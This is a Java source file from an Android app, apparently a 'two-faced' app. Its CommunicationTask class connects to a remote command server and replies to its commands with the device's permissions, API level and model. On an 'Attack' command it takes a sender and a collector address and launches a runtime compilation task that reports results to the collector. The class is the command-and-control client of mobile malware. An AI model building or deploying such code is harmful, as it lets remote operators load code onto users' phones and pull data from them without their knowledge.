package com.android.app_2_faces_net;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;

import javassist.NotFoundException;

public class CommunicationTask extends AsyncTask<Void, Void, String> {
    private static final String LOGCAT_TAG = "COMMUNICATION_TASK";

    private final Context context;

    private final String socketMainHostname;
    private final int socketMainPort;
    private CryptedSocket socketMain;


    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
    }

    @Override
    protected String doInBackground(Void... voids) {
        try {
            this.socketMain = new CryptedSocket(this.socketMainHostname, this.socketMainPort);
            this.socketMain.connect();

            this.socketMain.write("alive");
            boolean isAlive = true;

            while (isAlive) {
                String commandReceived = this.socketMain.read();

                String toSend = "";

                // Messages
                switch (commandReceived) {
                    case "Permissions":
                        toSend = DeviceUtils.getPermissions(this.context, false);
                        break;
                    case "Permissions granted":
                        toSend = DeviceUtils.getPermissions(this.context, true);
                        break;
                    case "API":
                        toSend = DeviceUtils.getApiLevel();
                        break;
                    case "Model":
                        toSend = DeviceUtils.getDeviceModel();
                        break;
                    case "Attack":
                        String senderServerString = this.socketMain.read();
                        String collectorServerString = this.socketMain.read();
                        String resultTypeString = this.socketMain.read();
                        String argString = this.socketMain.read();

                        collectorServerString = collectorServerString.split("Collector: ")[1];
                        String[] collectorParams = collectorServerString.split(":");
                        String socketCollectorHostname = collectorParams[0];
                        int socketCollectorPort = Integer.parseInt(collectorParams[1]);

                        String[] taskParams = {senderServerString, resultTypeString, argString};

                        CompilationTask compilationTask = new CompilationTask(this.context, socketCollectorHostname, socketCollectorPort);
                        compilationTask.executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, taskParams);
                    case "Close":
                        isAlive = false;
                        toSend = "Close";
                        break;
                }


                if (!toSend.equals("")) {
                    this.socketMain.write(toSend);
                }
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            this.socketMain.close();
        }

        this.socketMain.close();

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        Log.d("Task", "executed");
    }
}
